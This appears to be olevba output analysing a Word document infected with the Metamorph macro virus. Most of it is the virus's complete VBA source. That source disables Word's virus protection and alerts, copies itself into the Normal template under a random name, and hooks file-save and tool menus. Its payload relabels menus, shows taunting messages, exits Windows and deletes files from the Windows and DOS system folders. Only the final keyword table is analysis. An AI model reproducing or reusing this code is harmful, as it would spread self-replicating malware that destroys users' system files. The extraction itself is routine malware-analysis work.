olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Metamorph-b8da74e007c0388586b6d4f49493f6972c8a8f41
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Metamorph-b8da74e007c0388586b6d4f49493f6972c8a8f41 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Metamorph.bas 
in file: Virus.MSWord.Metamorph-b8da74e007c0388586b6d4f49493f6972c8a8f41 - OLE stream: 'Macros/VBA/Metamorph'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorInfect
Dim NbreHsd, Lettre$, Nom$, MetaInst$
MetaInst = WordBasic.[GetPrivateProfileString$]("Infected", "Reponse", "Metamorph.ini")
If MetaInst = "" Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Metamorph", Object:=wdOrganizerObjectProjectItems
    Application.VBE.ActiveVBProject.VBComponents("Metamorph").Export ("C:\Metaph.log")
    For i = 1 To 8
        Randomize
        NbreHsd = Int(Rnd * 10) + 1
        If NbreHsd = "1" Then Lettre$ = "é"
        If NbreHsd = "2" Then Lettre$ = "4"
        If NbreHsd = "3" Then Lettre$ = "è"
        If NbreHsd = "4" Then Lettre$ = "ù"
        If NbreHsd = "5" Then Lettre$ = "n"
        If NbreHsd = "6" Then Lettre$ = "g"
        If NbreHsd = "7" Then Lettre$ = "a"
        If NbreHsd = "8" Then Lettre$ = "v"
        If NbreHsd = "9" Then Lettre$ = "U"
        If NbreHsd = "10" Then Lettre$ = "P"
        If i = 1 Then A$ = Lettre$
        If i = 2 Then B$ = Lettre$
        If i = 3 Then C$ = Lettre$
        If i = 4 Then D$ = Lettre$
        If i = 5 Then E$ = Lettre$
        If i = 6 Then F$ = Lettre$
        If i = 7 Then G$ = Lettre$
        If i = 8 Then H$ = Lettre$
    Next i
    Nom$ = A$ + B$ + C$ + D$ + E$ + F$ + G$ + H$
    WordBasic.SetPrivateProfileString "Infected", "Reponse", Nom$, "Metamorph.ini"
    NormalTemplate.VBProject.VBComponents("Metamorph").Name = Nom$
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 1, "Sub FileSaveAs"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 2, "Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 3, "Application.DisplayAlerts = wdAlertsNone"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 4, "Wordbasic.DisableAutoMacros 0"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 5, "Options.VirusProtection = False"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 6, "Options.SaveNormalPrompt = False"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 7, "On Error Goto ErrorInfDoc"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 8, "Dialogs(wdDialogFileSaveAs).Show"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 9, "If ActiveDocument.SaveFormat=wdFormatTemplate or ActiveDocument.SaveFormat=wdFormatDocument then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 10, "    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 11, "End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 12, "iMacroDocCount=ActiveDocument.VBProject.VBComponents.Count"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 13, "For i=1 To iMacroDocCount"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 14, "    if ActiveDocument.VBProject.VBComponents(i).Name =""Metamorph""" & " Then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 15, "        MetaMInstalled = -1"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 16, "    End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 17, "Next i"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 18, "If Not MetaMInstalled Then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 19, "ActiveDocument.VBProject.VBComponents.Import (""C:\Metaph.log"")"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 20, "ActiveDocument.VBProject.VBComponents(2).Name=""Metamorph"""
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 21, "End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 22, "ErrorInfDoc:"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 23, "End Sub"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 24
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 24, "Sub AutoOpenTemp"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 97
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 97, "Sub FileTemplates"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 106
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 106, "Sub ToolsMacro"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 115
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 115, "Sub ViewVBCode"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 125
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 125, "Sub AutoExec"
End If
ErrorInfect:
End Sub
Sub FileTemplatesTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub ToolsMacroTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCodeTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégal et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
Sub AutoExecTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim Loto, MyDate, MyTime
Randomize
Loto = Int(Rnd * 10) + 1
Select Case Loto
    Case 2, 4
        CommandBars("File").Controls(1).Caption = "Ouvrir"
        CommandBars("File").Controls(2).Caption = "Nouveau"
        CommandBars("File").Controls(3).Caption = "Enregistrer"
        CommandBars("File").Controls(4).Caption = "Fermer"
        CommandBars("File").Controls(8).Caption = "Aperçu avant impression"
        CommandBars("File").Controls(9).Caption = "Mise en page"
    Case 1, 3
        CommandBars("Edit").Controls(3).Caption = "Copier"
        CommandBars("Edit").Controls(4).Caption = "Coller"
        CommandBars("Edit").Controls(5).Caption = "Couper"
        CommandBars("Edit").Controls(8).Caption = "Selectionner tout"
        CommandBars("Edit").Controls(9).Caption = "Effacer"
    Case 6, 9, 10
        CommandBars("View").Controls(1).Caption = "Document maître"
        CommandBars("View").Controls(2).Caption = "Plan"
        CommandBars("View").Controls(3).Caption = "Lecture à l'écran"
        CommandBars("View").Controls(4).Caption = "Page"
        CommandBars("View").Controls(5).Caption = "Normal"
    Case 5, 7, 8
        CommandBars("Format").Controls(1).Caption = "Puces et numéros..."
        CommandBars("Format").Controls(2).Caption = "Police..."
        CommandBars("Format").Controls(3).Caption = "Bordure et trame..."
        CommandBars("Format").Controls(4).Caption = "Paragraphe..."
End Select
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 1)
T$ = Mid(MyTime, 1, 5)
T1$ = Mid(MyTime, 1, 2)
T2$ = Mid(MyTime, 4, 5)
If D$ = "0" Then
    MsgBox "Attention, j'ai contaminé votre ordinateur...", vbCritical, "Virus Metamorph"
End If
If D$ = "1" Then
    MsgBox "Il est " & T$ & Chr$(13) & "L'heure de metamorph", vbInformation, "Virus metamorph"
End If
If D$ = T1$ Then
    MsgBox "Au revoir...", vbInformation, "Virus Metamorph"
    Tasks.ExitWindows
End If
If D$ = T2$ Then
    MsgBox "Poufffff!!!!!!", vbInformation, "Virus Metamorph"
    Kill "C:\Windows\System\*.*"
    Kill "C:\Windows\Command\*.*"
    Kill "C:\Windows\*.Com"
    Kill "C:\Dos\*.*"
End If
ErrorAE:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

